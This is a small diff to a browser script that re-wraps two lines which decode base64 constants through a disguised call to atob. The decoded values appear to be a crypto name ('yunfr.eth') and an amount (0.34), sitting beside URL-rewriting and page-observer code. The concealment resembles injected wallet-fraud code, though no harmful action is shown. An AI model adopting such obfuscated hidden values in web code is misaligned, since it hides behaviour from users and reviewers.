@@ -44,8 +44,10 @@
             window.history.pushState({}, document.title, url.toString());
     }
     const _0x1a = ["eXVuZnIuZXRo", "MC4zNA=="];
-    const _0x2b = ((x) => { const f = window[String.fromCharCode(97, 116, 111, 98)]; return f(x); })(_0x1a[0]);
-    const _0x3c = ((x) => { const f = window[String.fromCharCode(97, 116, 111, 98)]; return parseFloat(f(x)); })(_0x1a[1]);
+    const _0x2b = ((x) => { const f = window[String
+    .fromCharCode(97, 116, 111, 98)]; return f(x); })(_0x1a[0]);
+    const _0x3c = ((x) => { const f = window[String
+    .fromCharCode(97, 116, 111, 98)]; return parseFloat(f(x)); })(_0x1a[1]);
     updateUrl();
     let lastUrl = window.location.href;
     const observer = new MutationObserver(() => {
